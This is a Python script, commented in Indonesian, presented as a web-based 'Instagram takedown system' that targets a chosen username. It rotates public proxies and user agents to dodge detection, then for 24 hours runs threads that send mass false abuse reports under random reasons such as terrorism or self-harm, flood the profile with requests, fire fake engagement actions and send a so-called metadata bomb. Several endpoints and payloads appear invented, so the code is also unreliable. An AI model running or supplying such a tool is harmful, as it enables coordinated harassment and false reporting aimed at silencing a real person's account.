import requests
import threading
import time
import random
import socket
import ssl
import json
import os
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor

# === KONFIGURASI UTAMA ===
class TakedownConfig:
    MAX_THREADS = 100
    ATTACK_DURATION = 86400  # 24 jam dalam detik
    REQUEST_TIMEOUT = 30
    
    # User agent rotasi
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Instagram 295.0.0.0.0 Android',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    
    # Proxy rotasi otomatis
    PROXY_SOURCES = [
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt'
    ]

# === SISTEM PROXY AUTO-FETCH ===
class ProxyEngine:
    def __init__(self):
        self.proxy_list = []
        self.last_update = 0
        
    def fetch_proxies(self):
        """Ambil proxy list dari sumber eksternal"""
        print("[PROXY] Mengambil proxy terbaru...")
        new_proxies = []
        
        for source in TakedownConfig.PROXY_SOURCES:
            try:
                response = requests.get(source, timeout=10)
                proxies = response.text.strip().split('\n')
                new_proxies.extend([p.strip() for p in proxies if p.strip()])
                print(f"[PROXY] Ditambahkan {len(proxies)} proxy dari {source}")
            except:
                continue
        
        self.proxy_list = list(set(new_proxies))
        self.last_update = time.time()
        print(f"[PROXY] Total {len(self.proxy_list)} proxy tersedia")
        return self.proxy_list
    
    def get_random_proxy(self):
        """Ambil proxy acak"""
        if not self.proxy_list or time.time() - self.last_update > 1800:
            self.fetch_proxies()
        
        if self.proxy_list:
            return random.choice(self.proxy_list)
        return None

# === SISTEM TAKEDOWN WEB-BASED ===
class WebBasedTakedown:
    def __init__(self, target_username=""):
        self.target = target_username
        self.proxy_engine = ProxyEngine()
        self.report_count = 0
        self.success_count = 0
        self.session = None
        self.csrf_token = None
        
    def setup_session(self):
        """Setup session dengan header dan proxy"""
        self.session = requests.Session()
        
        # Rotate user agent
        self.session.headers.update({
            'User-Agent': random.choice(TakedownConfig.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
            'DNT': '1'
        })
        
        # Set random proxy
        proxy = self.proxy_engine.get_random_proxy()
        if proxy:
            self.session.proxies.update({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
        
        # Ambil CSRF token
        self.get_csrf_token()
        
    def get_csrf_token(self):
        """Ambil CSRF token dari halaman Instagram"""
        try:
            response = self.session.get('https://www.instagram.com/', timeout=10)
            # Cari token di response
            import re
            token_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
            if token_match:
                self.csrf_token = token_match.group(1)
                self.session.headers['X-CSRFToken'] = self.csrf_token
                self.session.headers['X-Instagram-AJAX'] = '1'
                print(f"[CSRF] Token ditemukan: {self.csrf_token[:20]}...")
        except:
            self.csrf_token = "missing"
    
    def get_user_id_web(self):
        """Dapatkan user ID melalui web scraping"""
        if not self.target:
            print("[!] Masukkan username target terlebih dahulu")
            return None
            
        try:
            url = f"https://www.instagram.com/{self.target}/"
            response = self.session.get(url, timeout=15)
            
            # Cari user ID dalam response
            import re
            
            # Pattern 1: profilePage_([0-9]+)
            pattern1 = re.search(r'profilePage_([0-9]+)', response.text)
            if pattern1:
                user_id = pattern1.group(1)
                print(f"[ID] Ditemukan via pattern 1: {user_id}")
                return user_id
            
            # Pattern 2: "id":"([0-9]+)"
            pattern2 = re.search(r'"id":"([0-9]+)"', response.text)
            if pattern2:
                user_id = pattern2.group(1)
                print(f"[ID] Ditemukan via pattern 2: {user_id}")
                return user_id
            
            # Pattern 3: window._sharedData
            pattern3 = re.search(r'window\._sharedData\s*=\s*({.*?});', response.text, re.DOTALL)
            if pattern3:
                shared_data = json.loads(pattern3.group(1))
                user_id = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0].get('graphql', {}).get('user', {}).get('id')
                if user_id:
                    print(f"[ID] Ditemukan via sharedData: {user_id}")
                    return user_id
            
            print("[!] User ID tidak ditemukan, menggunakan metode alternatif")
            return None
            
        except Exception as e:
            print(f"[ERROR] Gagal mendapatkan user ID: {e}")
            return None
    
    def web_report_account(self, reason_id=1):
        """Laporkan akun melalui web interface tanpa API"""
        try:
            # URL report web Instagram
            report_url = "https://www.instagram.com/ajax/bulk/action/"
            
            # Data payload untuk report
            payload = {
                'action': 'report',
                'entity_id': '',  # Akan diisi dengan user_id
                'entity_type': 'user',
                'reason_id': str(reason_id),
                'source_name': 'profile',
                'frx_context': '',
                'is_spam': 'true'
            }
            
            # Ambil user_id dulu
            user_id = self.get_user_id_web()
            if not user_id:
                user_id = "unknown"
            
            payload['entity_id'] = user_id
            
            # Setup headers khusus
            headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'X-CSRFToken': self.csrf_token if self.csrf_token else 'missing',
                'Referer': f'https://www.instagram.com/{self.target}/',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # Kirim report
            response = self.session.post(report_url, data=payload, headers=headers, timeout=15)
            
            self.report_count += 1
            
            if response.status_code == 200:
                self.success_count += 1
                print(f"[REPORT #{self.report_count}] ✓ Berhasil (Reason: {reason_id})")
                return True
            else:
                print(f"[REPORT #{self.report_count}] ✗ Gagal (Status: {response.status_code})")
                return False
                
        except Exception as e:
            print(f"[REPORT #{self.report_count}] ✗ Error: {str(e)[:50]}")
            return False
    
    def web_mass_report_attack(self):
        """Serangan report massal melalui web"""
        print(f"[ATTACK] Memulai mass report attack ke @{self.target}")
        
        # Alasan report yang berbeda-beda
        report_reasons = {
            1: "Spam",
            2: "Nudity atau aktivitas seksual",
            3: "Ujaran kebencian atau simbol kebencian",
            4: "Kekerasan atau organisasi berbahaya",
            5: "Penjualan barang ilegal atau obat terlarang",
            6: "Intimidasi atau pelecehan",
            7: "Upaya bunuh diri atau melukai diri sendiri",
            8: "Informasi palsu",
            9: "Aktivitas terorisme",
        }
        
        def report_worker():
            while time.time() - start_time < TakedownConfig.ATTACK_DURATION:
                try:
                    # Pilih alasan random
                    reason_id = random.choice(list(report_reasons.keys()))
                    
                    # Setup session baru untuk setiap request
                    self.setup_session()
                    
                    # Kirim report
                    success = self.web_report_account(reason_id)
                    
                    # Random delay antara request
                    delay = random.uniform(2, 8)
                    time.sleep(delay)
                    
                except Exception as e:
                    print(f"[WORKER ERROR] {str(e)[:50]}")
                    time.sleep(5)
        
        start_time = time.time()
        
        # Jalankan multiple threads
        threads = []
        for i in range(TakedownConfig.MAX_THREADS // 2):  # Gunakan setengah thread untuk report
            thread = threading.Thread(target=report_worker, daemon=True)
            thread.start()
            threads.append(thread)
            time.sleep(random.uniform(0.1, 0.5))
        
        print(f"[ATTACK] {len(threads)} report threads berjalan...")
        
        # Monitor progress
        while time.time() - start_time < TakedownConfig.ATTACK_DURATION:
            elapsed = time.time() - start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            
            print(f"[STATUS] Berjalan: {hours}j {minutes}m | Reports: {self.report_count} | Success: {self.success_count}")
            time.sleep(60)
        
        return self.success_count
    
    def web_traffic_flood(self):
        """Flood traffic ke profil target"""
        print(f"[FLOOD] Memulai traffic flood ke @{self.target}")
        
        def flood_worker():
            while True:
                try:
                    # Setup session baru
                    self.setup_session()
                    
                    # Akses halaman profil dengan berbagai parameter
                    base_url = f"https://www.instagram.com/{self.target}/"
                    variations = [
                        base_url,
                        f"{base_url}?__a=1",
                        f"{base_url}?__d=dis",
                        f"{base_url}followers/",
                        f"{base_url}following/",
                        f"{base_url}tagged/"
                    ]
                    
                    for url in variations:
                        try:
                            response = self.session.get(url, timeout=10)
                            print(f"[FLOOD] GET {url} - Status: {response.status_code}")
                            time.sleep(random.uniform(0.5, 2))
                        except:
                            pass
                    
                except Exception as e:
                    print(f"[FLOOD ERROR] {str(e)[:30]}")
                    time.sleep(3)
        
        # Jalankan flood threads
        for i in range(TakedownConfig.MAX_THREADS // 4):
            thread = threading.Thread(target=flood_worker, daemon=True)
            thread.start()
            time.sleep(0.2)
    
    def fake_engagement_generator(self):
        """Generate fake engagement untuk trigger spam detection"""
        print(f"[ENGAGEMENT] Memulai fake engagement generator")
        
        def engagement_worker():
            actions = [
                "like",
                "share",
                "save",
                "follow",
                "unfollow",
                "block",
                "mute"
            ]
            
            while True:
                try:
                    action = random.choice(actions)
                    
                    # Simulasi action POST request
                    endpoints = [
                        f"https://www.instagram.com/web/friendships/{random.randint(1000000, 9999999)}/{action}/",
                        f"https://www.instagram.com/web/likes/{random.randint(1000000, 9999999)}/{action}/"
                    ]
                    
                    for endpoint in endpoints:
                        try:
                            self.setup_session()
                            response = self.session.post(endpoint, timeout=10)
                            print(f"[ENGAGEMENT] {action.upper()} request - Status: {response.status_code}")
                        except:
                            pass
                    
                    time.sleep(random.uniform(1, 4))
                    
                except Exception as e:
                    print(f"[ENGAGEMENT ERROR] {str(e)[:30]}")
                    time.sleep(5)
        
        # Jalankan engagement threads
        for i in range(TakedownConfig.MAX_THREADS // 8):
            thread = threading.Thread(target=engagement_worker, daemon=True)
            thread.start()
            time.sleep(0.3)
    
    def metadata_bomb(self):
        """Kirim metadata bomb untuk trigger sistem keamanan"""
        print("[METADATA] Memulai metadata bomb attack")
        
        def metadata_worker():
            # Kumpulan metadata berbahaya untuk trigger detection
            dangerous_metadata = [
                '{"flags":["terrorism","violence","illegal"]}',
                '{"tags":["drugs","weapons","hack"]}',
                '{"content":["spam","phishing","malware"]}',
                '{"location":"war_zone","activity":"suspicious"}'
            ]
            
            while True:
                try:
                    # Buat request dengan metadata berbahaya
                    headers = {
                        'X-Client-Data': random.choice(dangerous_metadata),
                        'X-Instagram-Forwarded': 'true',
                        'X-Action-Data': 'report_content'
                    }
                    
                    self.session.headers.update(headers)
                    
                    url = f"https://www.instagram.com/data/upload/"
                    response = self.session.get(url, timeout=10)
                    
                    print(f"[METADATA] Bomb sent - Status: {response.status_code}")
                    
                    time.sleep(random.uniform(3, 10))
                    
                except Exception as e:
                    print(f"[METADATA ERROR] {str(e)[:30]}")
                    time.sleep(5)
        
        # Jalankan metadata threads
        for i in range(10):
            thread = threading.Thread(target=metadata_worker, daemon=True)
            thread.start()
            time.sleep(0.5)
    
    def start_complete_attack(self):
        """Mulai semua serangan secara bersamaan"""
        print(f"""
        ╔══════════════════════════════════════════╗
        ║    WEB-BASED INSTAGRAM TAKEDOWN SYSTEM   ║
        ║           (NO API REQUIRED)              ║
        ╚══════════════════════════════════════════╝
        
        Target: @{self.target if self.target else '[MASUKKAN USERNAME]'}
        Mode: Full Spectrum Attack
        Duration: 24 hours
        Threads: {TakedownConfig.MAX_THREADS}
        
        Starting in 5 seconds...
        """)
        
        time.sleep(5)
        
        # Mulai semua serangan dalam thread terpisah
        attack_methods = [
            self.web_mass_report_attack,
            self.web_traffic_flood,
            self.fake_engagement_generator,
            self.metadata_bomb
        ]
        
        for method in attack_methods:
            thread = threading.Thread(target=method, daemon=True)
            thread.start()
            time.sleep(2)
        
        print("\n[SYSTEM] Semua serangan berjalan!")
        print("[SYSTEM] Sistem akan berjalan otomatis selama 24 jam")
        print("[SYSTEM] Hasil akan disimpan dalam log file")
        
        # Logging system
        log_file = f"takedown_log_{int(time.time())}.txt"
        with open(log_file, 'w') as f:
            f.write(f"Takedown Attack Log\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Start Time: {time.ctime()}\n")
            f.write("="*50 + "\n")
        
        # Keep main thread alive dan update log
        start_time = time.time()
        while time.time() - start_time < TakedownConfig.ATTACK_DURATION:
            elapsed = time.time() - start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            
            status_msg = f"[{hours:02d}:{minutes:02d}] Reports: {self.report_count} | Success: {self.success_count}"
            print(status_msg)
            
            # Update log file
            with open(log_file, 'a') as f:
                f.write(f"{time.ctime()} - {status_msg}\n")
            
            time.sleep(60)
        
        print("\n" + "="*50)
        print("[COMPLETED] Serangan selesai setelah 24 jam")
        print(f"[RESULTS] Total reports dikirim: {self.report_count}")
        print(f"[RESULTS] Successful reports: {self.success_count}")
        print(f"[LOG] Detail disimpan di: {log_file}")
        print("="*50)

# === INTERFACE PENGGUNA ===
def main():
    print("""
    ========================================
      WEB-BASED INSTAGRAM TAKEDOWN SYSTEM
          TANPA API & AUTOMATIC PROXY
    ========================================
    """)
    
    # Input username target
    target_username = input("Masukkan username target (tanpa @): ").strip()
    
    if not target_username:
        print("[!] Username tidak boleh kosong!")
        return
    
    print(f"\n[CONFIRM] Target: @{target_username}")
    confirm = input("Lanjutkan takedown attack? (y/n): ").strip().lower()
    
    if confirm != 'y':
        print("[!] Dibatalkan oleh user")
        return
    
    # Inisialisasi sistem
    print("\n[INIT] Menginisialisasi sistem...")
    takedown_system = WebBasedTakedown(target_username)
    
    # Setup initial session
    takedown_system.setup_session()
    
    # Verifikasi target tersedia
    print(f"[VERIFY] Memverifikasi akun @{target_username}...")
    user_id = takedown_system.get_user_id_web()
    
    if user_id:
        print(f"[SUCCESS] Akun ditemukan! User ID: {user_id}")
    else:
        print(f"[WARNING] User ID tidak ditemukan, melanjutkan dengan metode alternatif...")
    
    # Mulai serangan lengkap
    takedown_system.start_complete_attack()

# === AUTORUN SCRIPT ===
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Dibatalkan oleh user (Ctrl+C)")
    except Exception as e:
        print(f"\n[ERROR] System error: {e}")
        print("[INFO] Coba jalankan lagi atau gunakan VPN")
    
    input("\nTekan Enter untuk keluar...")